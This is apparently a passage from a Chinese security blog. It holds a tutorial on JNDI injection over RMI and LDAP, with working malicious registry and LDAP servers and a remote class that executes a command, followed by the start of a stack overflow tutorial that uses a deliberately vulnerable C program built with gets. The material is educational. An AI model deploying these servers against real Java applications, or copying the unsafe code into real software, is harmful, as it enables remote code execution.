<h1 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h1><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext() </span><br><span class="line">构建一个初始上下文。  </span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy) </span><br><span class="line">构造一个初始上下文，并选择不初始化它。  </span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class="line">使用提供的环境构建初始上下文。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>


<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">  将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">  枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">  检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">  将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">  取消绑定命名对象。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h1><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
<h2 id="构造方法-1"><a href="#构造方法-1" class="headerlink" title="构造方法"></a>构造方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">  为类名为“className”的对象构造一个新的引用。  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">  为类名为“className”的对象和地址构造一个新引用。  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">  为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">  为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
<h2 id="常用方法-1"><a href="#常用方法-1" class="headerlink" title="常用方法"></a>常用方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, RefAddr addr)</span> </span><br><span class="line">  将地址添加到索引posn的地址列表中。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(RefAddr addr)</span> </span><br><span class="line">  将地址添加到地址列表的末尾。  </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">clear</span><span class="params">()</span> </span><br><span class="line">  从此引用中删除所有地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  检索索引posn上的地址。  </span><br><span class="line">RefAddr <span class="title function_">get</span><span class="params">(String addrType)</span> </span><br><span class="line">  检索地址类型为“addrType”的第一个地址。  </span><br><span class="line">Enumeration&lt;RefAddr&gt; <span class="title function_">getAll</span><span class="params">()</span> </span><br><span class="line">  检索本参考文献中地址的列举。  </span><br><span class="line">String <span class="title function_">getClassName</span><span class="params">()</span> </span><br><span class="line">  检索引用引用的对象的类名。  </span><br><span class="line">String <span class="title function_">getFactoryClassLocation</span><span class="params">()</span> </span><br><span class="line">  检索此引用引用的对象的工厂位置。  </span><br><span class="line">String <span class="title function_">getFactoryClassName</span><span class="params">()</span> </span><br><span class="line">  检索此引用引用对象的工厂的类名。    </span><br><span class="line">Object <span class="title function_">remove</span><span class="params">(<span class="type">int</span> posn)</span> </span><br><span class="line">  从地址列表中删除索引posn上的地址。  </span><br><span class="line"><span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> </span><br><span class="line">  检索此引用中的地址数。  </span><br><span class="line">String <span class="title function_">toString</span><span class="params">()</span> </span><br><span class="line">  生成此引用的字符串表示形式。  </span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="JNDI注入-RMI实现攻击"><a href="#JNDI注入-RMI实现攻击" class="headerlink" title="JNDI注入+RMI实现攻击"></a>JNDI注入+RMI实现攻击</h1><p>下面还是来看几段代码，来做一个分析具体的攻击流程。</p>
<h2 id="RMIServer代码："><a href="#RMIServer代码：" class="headerlink" title="RMIServer代码："></a>RMIServer代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;obj&quot;</span>,referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="RMIClient代码："><a href="#RMIClient代码：" class="headerlink" title="RMIClient代码："></a>RMIClient代码：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/obj&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>下面还需要一段执行命令的代码，挂载在web页面上让server端去请求。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>使用javac命令，将该类编译成class文件挂载在web页面上。</p>
<p>原理其实就是把恶意的<code>Reference</code>类，绑定在RMI的Registry 里面，在客户端调用<code>lookup</code>远程获取远程类的时候，就会获取到<code>Reference</code>对象，获取到<code>Reference</code>对象后，会去寻找<code>Reference</code>中指定的类，如果查找不到则会在<code>Reference</code>中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。</p>
<h1 id="JNDI注入-LDAP实现攻击"><a href="#JNDI注入-LDAP实现攻击" class="headerlink" title="JNDI注入+LDAP实现攻击"></a>JNDI注入+LDAP实现攻击</h1><h2 id="LDAP概念"><a href="#LDAP概念" class="headerlink" title="LDAP概念"></a>LDAP概念</h2><p>轻型目录访问协议（英文：<code>Lightweight Directory Access Protocol</code>，缩写：<code>LDAP</code>）是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。</p>
<p>有了前面的案例后，再来看这个其实也比较简单，之所以JNDI注入会配合LDAP是因为LDAP服务的Reference远程加载Factory类不受<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制。</p>
<p>启动一个ldap服务，该代码由某大佬改自marshalsec。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1:8080/#test&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[ <span class="number">0</span> ])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>编写一个client客户端。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.rmiclient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">clientdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        Object object=<span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://127.0.0.1:7777/calc&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>编写一个远程恶意类，并将其编译成class文件，放置web页面中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>这里有个坑点，就是恶意的类，不能包含最上面的package信息，否则会调用失败。下面来启动一下服务器端，然后启动客户端。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>在 JDK 8u191 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被调整为false。这样的方式没法进行利用，但是还是会有绕过方式。在这里不做赘述。</p>
<p>参考文章</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//xz.aliyun.com/t/8214</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/6633</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/7264</span></span><br><span class="line">https:<span class="comment">//blog.wuhao13.xin/655.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_33020901/article/details/98472921</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出</title>
    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研究了一段时间，做个总结。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
<span id="more"></span>

<h1 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h1><p>栈是一种典型的后进先出 <code>(Last in First Out)</code> 的数据结构，其操作主要有<code>压栈 (push)</code> 与<code>出栈 (pop)</code> 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<ul>
<li><strong>x86</strong><ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li><strong>x64</strong><ul>
<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
</ul>
</li>
</ul>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
<p>我们利用如下命令对其进行编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): 警告： the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>


<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
<blockquote>
<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
</blockquote>
<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>


